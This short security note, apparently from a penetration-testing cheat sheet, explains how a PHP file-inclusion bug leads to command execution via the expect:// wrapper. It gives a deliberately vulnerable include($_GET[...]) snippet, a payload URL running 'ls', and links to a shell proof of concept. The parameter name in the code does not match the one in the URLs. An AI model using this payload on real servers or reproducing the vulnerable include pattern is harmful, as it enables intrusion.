###PHP expect:// Remote Command Execution
####The expect wrapper is not enabled by default

If we were to have the example code below:

```
<?php
$code = $_GET['hax'];
include($code);
?>
```

It is easy to see the file inclusion bug.

However, the above code could also lead to remote command execution if the expect:// PHP wrapper is enabled.

For example, let's assume that the above code is in a file named lfi.php. e.g. `http://example.com/lfi.php?file=`

If that were the case, and the expect wrapper was enabled, RCE would have been possible via:

`http://example.com/lfi.php?file=expect://ls`

Further Reading:

[I expect:// a shell!](http://insecurety.net/?p=724)
[expect:// to interactive shell PoC](http://insecurety-research.googlecode.com/files/expectsh-0.3.py)

